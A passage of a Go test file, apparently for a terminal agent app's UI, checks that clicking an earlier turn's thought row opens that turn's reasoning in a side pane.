// turn's thought row shows that run in the pane, also when the pane already
// shows it; only the digest's fold returns the pane to the live turn.
func TestPaneInspectsEarlierTurn(t *testing.T) {
	app, host := bootAgentApp(t, 120, 30)
	if err := host.ToggleReasoning(); err != nil {
		t.Fatal(err)
	}
	waitPrompt(t, app, func() bool { return !host.Layout().Root.Children[1].Children[1].Children[1].Children[1].Hidden })
	host.AppendMessage("user", "first")
	appendReasoning(host, "alpha thinking", hostapi.TurnStat{ThoughtMS: 1500})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "a.go", Status: "ok"})
	appendReasoning(host, "alpha two", hostapi.TurnStat{ThoughtMS: 2500})
	appendReply(host, "one", hostapi.TurnStat{})
	host.AppendMessage("user", "second")
	appendReasoning(host, "beta thinking", hostapi.TurnStat{ThoughtMS: 1500})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "b.go", Status: "ok"})
	appendReply(host, "two", hostapi.TurnStat{})
	app.renderSync(t)
	click := func(text string) string {
		// in the chat, left of the pane
		lines := strings.Split(ansi.Strip(app.Frame()), "\r\n")
		x, y := -1, -1
		for i, l := range lines {
			if j := strings.Index(ansi.Cut(l, 0, 80), text); j >= 0 {
				x, y = j, i
				break
			}
		}
		if x < 0 {
			t.Fatalf("no %q in the chat", text)
		}
		clickAt(app, x+2, y)
		for app.Pump() {
		}
		app.renderSync(t)
		return ansi.Strip(app.Frame())
	}
	click("· 1 file · thought 4.0s") // open turn 1, which the pane then shows
	// a thought inside that run: the pane keeps showing the run
	if frame := click("✻ thought 2.5s"); !strings.Contains(frame, "alpha two") || strings.Contains(frame, "last turn") {
		t.Fatalf("turn 1's thought did not open in the pane:\n%s", frame)
	}
}
